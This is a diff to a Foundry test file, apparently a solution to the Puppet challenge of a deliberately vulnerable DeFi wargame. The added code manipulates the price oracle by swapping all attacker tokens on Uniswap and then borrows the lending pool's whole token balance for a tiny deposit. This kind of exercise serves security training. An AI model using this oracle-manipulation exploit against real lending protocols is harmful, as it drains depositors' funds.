@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
-
+ 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
@@ -100,6 +100,27 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+
+        // approve uniswap to use DVT
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // trade all DVT for ETH
+        uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            DEADLINE);
+
+        // compute oracle price
+        uint256 poolBalance = dvt.balanceOf(address(puppetPool));
+        uint256 depositRequired = puppetPool.calculateDepositRequired(poolBalance);
+        console.log("deposit required", depositRequired);
+        console.log("pool balance", poolBalance);
+
+        // borrow all DVT from pool
+        puppetPool.borrow{value: depositRequired}(poolBalance);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
